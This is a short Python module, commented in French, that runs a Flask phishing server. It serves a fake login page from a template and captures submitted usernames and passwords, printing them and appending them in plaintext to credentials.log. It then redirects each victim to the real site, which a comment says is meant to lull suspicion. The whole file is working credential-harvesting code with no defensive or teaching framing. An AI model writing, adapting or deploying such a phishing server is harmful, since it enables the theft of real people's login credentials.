from flask import Flask, render_template_string, request, redirect
import os
from datetime import datetime

def run(config):
    """
    Lance un serveur Flask pour héberger le site de phishing et capturer les données.
    """
    print("[*] Lancement du serveur de phishing avec Flask...")
    
    app = Flask(__name__, template_folder=os.path.abspath('templates'))
    
    # Page de phishing principale
    @app.route("/")
    def index():
        with open(os.path.join(app.template_folder, config['server']['template']), "r") as f:
            template_content = f.read()
        return render_template_string(template_content)

    # Route pour capturer les identifiants
    @app.route("/login", methods=['POST'])
    def login():
        username = request.form.get('username')
        password = request.form.get('password')
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        log_line = f"[{timestamp}] - Username: {username}, Password: {password}\n"
        print(f"[+] Identifiants capturés : {log_line.strip()}")

        # Enregistrement dans un fichier
        with open("credentials.log", "a") as log_file:
            log_file.write(log_line)
            
        # Redirection vers le vrai site pour endormir la méfiance
        return redirect(config['server']['redirect_url'])

    host = config['server'].get('host', '0.0.0.0')
    port = config['server'].get('port', 5000)
    print(f"[*] Faux site accessible sur http://{host}:{port}")
    app.run(host=host, port=port)
